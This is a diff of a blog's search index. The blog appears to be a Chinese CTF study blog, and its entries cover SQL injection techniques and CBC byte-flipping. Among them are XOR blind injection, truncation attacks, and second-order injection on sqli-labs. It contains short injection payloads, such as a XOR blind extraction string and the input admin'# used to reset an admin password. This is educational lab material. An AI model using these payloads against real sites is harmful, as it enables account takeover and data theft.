相同字符的绕过:题目中有是可能会出现一种情况: 它不允许出现某个字符串,但是在数据库中又确实存在这个字符串,再加之mysql与php的编码字符集不相同,便可以利用相似的字符将其绕过 1.png 可以参考的题目百度杯十月场look]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>其他类型注入的详解(5)</title>
-      <link href="/2019/03/16/sql8/"/>
-      <url>/2019/03/16/sql8/</url>
-      
-        <content type="html"><![CDATA[<h3 id="5-sql异或注入"><a href="#5-sql异或注入" class="headerlink" title="5.sql异或注入"></a>5.sql异或注入</h3><p>当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h4><ul><li>异或运算规则: <code>1^1=0 0^0=0 0^1=1</code><pre><code>`1^1^1=0 1^1^0=0`</code></pre></li><li>构造payload:<code>&#39;^ascii(mid(database(),1,1)=98)^0</code></li></ul><p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p><h4 id="实际应用-Bugku-login3"><a href="#实际应用-Bugku-login3" class="headerlink" title="实际应用:Bugku-login3"></a>实际应用:Bugku-login3</h4><p><a href="http://123.206.31.85:49167/" target="_blank" rel="noopener">login3</a></p>]]></content>
-      
-      
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[其他类型注入的详解(5)]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql8%2F</url>
+    <content type="text"><![CDATA[5.sql异或注入当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。 知识点 异或运算规则: 1^1=0 0^0=0 0^1=1`1^1^1=0 1^1^0=0` 构造payload:&#39;^ascii(mid(database(),1,1)=98)^0 注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的 实际应用:Bugku-login3login3]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>其他类型注入的详解(4)</title>
-      <link href="/2019/03/16/sql5/"/>
-      <url>/2019/03/16/sql5/</url>
-      
-        <content type="html"><![CDATA[<p>###4.sql约束攻击</p><p>####知识点</p><ol><li>数据库字符串比较:在数据库对字符串进行比较时,如果两个字符的长度不一样,则会将较短的字符串末尾填充空格,使两个字符串的长度一致.</li></ol><p>比如这两条语句</p><blockquote><p><code>select * from admin where username=&#39;vampire&#39;</code><br><br>    <code>select *from admin where username=&#39;vampire  &#39;</code></p></blockquote><p>他们的查询结果是一致的.<br></p><ol start="2"><li>INSERT截断: 这是数据库的另一个特性,当设计一字段时,我们都必须对其设定一个最大长度,比如CHAR(255),VARCHAR(20),但是当长度超过限制的时候,数据库就会将其截断,只保留限定的长度.<strong>(注意这里我们为什么需要insert注入:空格之后一定需要再跟一个或多个任意字符,防止程序在检查用户名是否已经存在时匹配到目标用户)</strong></li></ol><p>####限制条件</p><ol><li>服务端没有对用户名长度进行限制.</li><li>登陆验证的SQL语句没有和用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码，然后再比对密码的话，那么也不能进行利用。因为数据库一般取第一条则是目标用户的记录，那么你传输的密码肯定是和目标用户密码匹配不上的</li></ol><p>####实战:Bugku-login1<br><a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">login1</a></p>]]></content>
-      
-      
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[其他类型注入的详解(4)]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql5%2F</url>
+    <content type="text"><![CDATA[###4.sql约束攻击 ####知识点 数据库字符串比较:在数据库对字符串进行比较时,如果两个字符的长度不一样,则会将较短的字符串末尾填充空格,使两个字符串的长度一致. 比如这两条语句 select * from admin where username=&#39;vampire&#39; select *from admin where username=&#39;vampire &#39; 他们的查询结果是一致的. INSERT截断: 这是数据库的另一个特性,当设计一字段时,我们都必须对其设定一个最大长度,比如CHAR(255),VARCHAR(20),但是当长度超过限制的时候,数据库就会将其截断,只保留限定的长度.(注意这里我们为什么需要insert注入:空格之后一定需要再跟一个或多个任意字符,防止程序在检查用户名是否已经存在时匹配到目标用户) ####限制条件 服务端没有对用户名长度进行限制. 登陆验证的SQL语句没有和用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码，然后再比对密码的话，那么也不能进行利用。因为数据库一般取第一条则是目标用户的记录，那么你传输的密码肯定是和目标用户密码匹配不上的 ####实战:Bugku-login1login1]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>其他类型注入的详解(2)</title>
-      <link href="/2019/03/16/sql3/"/>
-      <url>/2019/03/16/sql3/</url>
-      
-        <content type="html"><![CDATA[<p>###2.截断注入</p><p>参考题目:<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">wanna see your hat</a></p>]]></content>
-      
-      
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[其他类型注入的详解(2)]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql3%2F</url>
+    <content type="text"><![CDATA[###2.截断注入 参考题目:wanna see your hat]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL注入学习总结(一):SQL注入的分类</title>
-      <link href="/2019/03/16/sql1/"/>
-      <url>/2019/03/16/sql1/</url>
-      
-        <content type="html"><![CDATA[<p>###1.按照执行效果分类</p><ol><li><p>基于布尔盲注,即只会回显true跟false,会根据你的注入信息返回true or false,也就没有了之前的报错信息(substr(),mid(),ascii())</p></li><li><p>基于报错的注入,即页面会返回错误的信息,或者把注入的语句的结果直接返回在页面中(updatexml(),floor(),rand(0)*2)</p></li><li><p>基于时间的盲注,即界面值只有一种,无论输入任何值,返回情况都会按照正常的来处理,而加入特定的时间函数,通过看返回的页面时间差来判断注入的语句是否正确.(sleep().benchmark())</p></li><li><p>堆查询注入,即以逗号分开的多条查询语句同时执行,但一般只返回第一条语句的查询结果,所以在第二条语句中进行注入时一般通过时间盲注来获取数据,有些数据库可以执行(pdo),有些不行</p></li><li><p>回显注入,一般是可以使用union的情况下进行注入</p></li></ol><hr><p>###2.按照注入点的类型来分类:</p><ol><li>数字型(select * from 表名 where id=x),一般的判断语句<br> <code>x and 1=1</code>页面正常运行,继续进行下一步(x已确认存在数据)<br> <code>x and 1=2</code>页面出错,说明该注入为数字型注入</li><li>字符型(select * from 表名 where id=’x’),一般判断的语句:<br> <code>x&#39; and 1=1 %23或 x&#39; and &#39;1&#39;=&#39;1</code>页面正常运行(#号也可能被过滤了导致不成功所以要多试)<br> <code>x&#39; and 1=2 %23或 x&#39; and &#39;1&#39;=&#39;2</code>页面出错,说明该注入为字符型</li><li>搜索型(再进行数据搜索的时候没有过滤参数 select * from 表名 where 字段 like ‘%keyword%’)<br> <code>x%&#39; and &#39;1&#39;=&#39;1&#39;%23</code>页面正常运行<br> <code>x%&#39; and &#39;1&#39;=&#39;2&#39;%23</code>页面出错,说明为一个搜索型的sql注入<br>注:用or也可以进行判断的,不过他更多的用于绕过登录</li></ol><hr><p>###3.按照数据提交的方式</p><ol><li>GET注入</li><li>POST注入</li><li>Cookie注入</li><li>XFF等一些需要补充参数的HTTP头部注入</li></ol><hr>]]></content>
-      
-      
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[其他类型注入的详解(1)]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql2%2F</url>
+    <content type="text"><![CDATA[1.二次注入 形成原理:在第一次进入数据库插入数据的时候,仅仅只是使用了addslashes或者是借助get_magic_quotes_gpc对其中的特殊字符进行转义,但是addslashes有一个特点就是虽然在参数前会添加’\’进行转义,但是’\’并不会进入数据库中,再写入数据库时还是保留了原来输入的数据.在下一次需要查询时就直接从数据库中取出了能够构成payload的语句.比如在第一次注入时写入了单引号,就可以形成二次注入。 Tips:一般题目中都会存在登陆注册两种功能(当然也不排除session文件包含) 例子:(sqli-labs less-24) 首先进入搭建好的sqli-labs less-24 注册一个新的账号admin&#39;# 1.png 查看此时数据库中已经多出一个账号了并且特殊符号没有被转义 2.png 我们尝试着登陆进去,会发现可以更改当前用户的密码 3.png 到数据库查看可以发现admin的密码被修改了,而admin’#的密码没有 4.png 我们可以查看pass_change.php的代码,发现修改密码这里的sql语句“UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’ “;5.png 我们可以看到如果将admin&#39;#带到里面去后:&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;# and password=&#39;$curr_pass&#39; &quot;;实际上就是:&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;这里后面的内容都被#注释掉了,这样就是在修改admin的密码了,我们再尝试登陆一下,发现利用admin也可以成功了 6.png]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>其他类型注入的详解(1)</title>
-      <link href="/2019/03/16/sql2/"/>
-      <url>/2019/03/16/sql2/</url>
-      
-        <content type="html"><![CDATA[<h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h3><blockquote><p>形成原理:在第一次进入数据库插入数据的时候,仅仅只是使用了addslashes或者是借助get_magic_quotes_gpc对其中的特殊字符进行转义,但是addslashes有一个特点就是虽然在参数前会添加’\’进行转义,但是’\’并不会进入数据库中,再写入数据库时还是保留了原来输入的数据.在下一次需要查询时就直接从数据库中取出了能够构成payload的语句.比如在第一次注入时写入了单引号,就可以形成二次注入。</p></blockquote><p><em>Tips:</em>一般题目中都会存在<strong>登陆注册</strong>两种功能(当然也不排除session文件包含)</p><h4 id="例子-sqli-labs-less-24"><a href="#例子-sqli-labs-less-24" class="headerlink" title="例子:(sqli-labs less-24)"></a>例子:(sqli-labs less-24)</h4><ol><li>首先进入搭建好的sqli-labs less-24</li><li>注册一个新的账号<code>admin&#39;#</code></li></ol><p><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b97890e69b76.png" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p><ol start="3"><li>查看此时数据库中已经多出一个账号了并且特殊符号没有被转义</li></ol><p><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b97890e9a1eb.png" alt="2.png"><figcaption class="figure__caption">2.png</figcaption></figure></p><ol start="4"><li>我们尝试着登陆进去,会发现可以更改当前用户的密码</li></ol><p><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b97890ea5883.png" alt="3.png"><figcaption class="figure__caption">3.png</figcaption></figure></p><ol start="5"><li>到数据库查看可以发现admin的密码被修改了,而admin’#的密码没有</li></ol><p><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b97890ec53e5.png" alt="4.png"><figcaption class="figure__caption">4.png</figcaption></figure></p><ol start="6"><li>我们可以查看pass_change.php的代码,发现修改密码这里的sql语句<br>“UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’ “;<br><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b978dbab7453.png" alt="5.png"><figcaption class="figure__caption">5.png</figcaption></figure></li></ol><p>我们可以看到如果将<code>admin&#39;#</code>带到里面去后:<br><code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;# and password=&#39;$curr_pass&#39; &quot;;</code><br>实际上就是:<br><code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;</code><br>这里后面的内容都被#注释掉了,这样就是在修改admin的密码了,我们再尝试登陆一下,发现利用admin也可以成功了</p><p><figure class="figure"><img src="https://i.loli.net/2018/09/11/5b9791c91357c.png" alt="6.png"><figcaption class="figure__caption">6.png</figcaption></figure></p>]]></content>
-      
-      
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQL注入学习总结(一):SQL注入的分类]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql1%2F</url>
+    <content type="text"><![CDATA[###1.按照执行效果分类 基于布尔盲注,即只会回显true跟false,会根据你的注入信息返回true or false,也就没有了之前的报错信息(substr(),mid(),ascii()) 基于报错的注入,即页面会返回错误的信息,或者把注入的语句的结果直接返回在页面中(updatexml(),floor(),rand(0)*2) 基于时间的盲注,即界面值只有一种,无论输入任何值,返回情况都会按照正常的来处理,而加入特定的时间函数,通过看返回的页面时间差来判断注入的语句是否正确.(sleep().benchmark()) 堆查询注入,即以逗号分开的多条查询语句同时执行,但一般只返回第一条语句的查询结果,所以在第二条语句中进行注入时一般通过时间盲注来获取数据,有些数据库可以执行(pdo),有些不行 回显注入,一般是可以使用union的情况下进行注入 ###2.按照注入点的类型来分类: 数字型(select * from 表名 where id=x),一般的判断语句 x and 1=1页面正常运行,继续进行下一步(x已确认存在数据) x and 1=2页面出错,说明该注入为数字型注入 字符型(select * from 表名 where id=’x’),一般判断的语句: x&#39; and 1=1 %23或 x&#39; and &#39;1&#39;=&#39;1页面正常运行(#号也可能被过滤了导致不成功所以要多试) x&#39; and 1=2 %23或 x&#39; and &#39;1&#39;=&#39;2页面出错,说明该注入为字符型 搜索型(再进行数据搜索的时候没有过滤参数 select * from 表名 where 字段 like ‘%keyword%’) x%&#39; and &#39;1&#39;=&#39;1&#39;%23页面正常运行 x%&#39; and &#39;1&#39;=&#39;2&#39;%23页面出错,说明为一个搜索型的sql注入注:用or也可以进行判断的,不过他更多的用于绕过登录 ###3.按照数据提交的方式 GET注入 POST注入 Cookie注入 XFF等一些需要补充参数的HTTP头部注入]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CBC翻转字节攻击</title>
-      <link href="/2019/03/16/sql4/"/>
-      <url>/2019/03/16/sql4/</url>
-      
-        <content type="html"><![CDATA[<h4 id="知识点-AES的CBC模式加密"><a href="#知识点-AES的CBC模式加密" class="headerlink" title="知识点:AES的CBC模式加密"></a>知识点:AES的CBC模式加密</h4><h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程:"></a>加密过程:</h5><blockquote><p>IV:用于随机化加密的字符串<br><br>            ciphertext_0=Encrypt(Plaintext XOR IV)只用于第一组块<br><br>            ciphertext_n=Encrypt(Plaintext XOR Ciphertext_N-1)用于除第一组之外的模块</p></blockquote><p><figure class="figure"><img src="https://i.loli.net/2018/09/12/5b98dc5c44de5.jpg" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p><hr><h5 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程:"></a>解密过程:</h5><blockquote><p>plaintext_0=Decrpt(Ciphertext) XOR IV 只用于第一组块<br><br>    plaintext_n=Decrpt(Ciphertext) XOR Ciphertext_n-1</p></blockquote><p><figure class="figure"><img src="https://i.loli.net/2018/09/12/5b98dc5c63805.jpg" alt="2.png"><figcaption class="figure__caption">2.png</figcaption></figure></p><hr><h4 id="CBC攻击"><a href="#CBC攻击" class="headerlink" title="CBC攻击"></a>CBC攻击</h4><p><strong>攻击发生在解密过程中,实质上就是通过更改上一块的内容,来间接修改明文中的内容,你在密文中改变的字节,只会影响到在下一明文当中,具有相同偏移量的字节.因此,进行cbc攻击仅影响到两个块.<br>主要用途:体现在不知道加密密钥的情况下,通过修改密文,可以间接修改明文</strong></p><p><figure class="figure"><img src="https://i.loli.net/2018/09/12/5b98dd24bba15.jpg" alt="3.png"><figcaption class="figure__caption">3.png</figcaption></figure></p><h4 id="实际应用-Bugku-login4"><a href="#实际应用-Bugku-login4" class="headerlink" title="实际应用:Bugku-login4"></a>实际应用:Bugku-login4</h4><p><a href="http://123.206.31.85:49168/" target="_blank" rel="noopener">login4</a></p>]]></content>
-      
-      
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CBC翻转字节攻击]]></title>
+    <url>%2F2019%2F03%2F16%2Fsql4%2F</url>
+    <content type="text"><![CDATA[知识点:AES的CBC模式加密加密过程: IV:用于随机化加密的字符串 ciphertext_0=Encrypt(Plaintext XOR IV)只用于第一组块 ciphertext_n=Encrypt(Plaintext XOR Ciphertext_N-1)用于除第一组之外的模块 1.png 解密过程: plaintext_0=Decrpt(Ciphertext) XOR IV 只用于第一组块 plaintext_n=Decrpt(Ciphertext) XOR Ciphertext_n-1 2.png CBC攻击攻击发生在解密过程中,实质上就是通过更改上一块的内容,来间接修改明文中的内容,你在密文中改变的字节,只会影响到在下一明文当中,具有相同偏移量的字节.因此,进行cbc攻击仅影响到两个块.主要用途:体现在不知道加密密钥的情况下,通过修改密文,可以间接修改明文 3.png 实际应用:Bugku-login4login4]]></content>
       <categories>
-          
-          <category> Web Security </category>
-          
+        <category>Web Security</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
 </search>
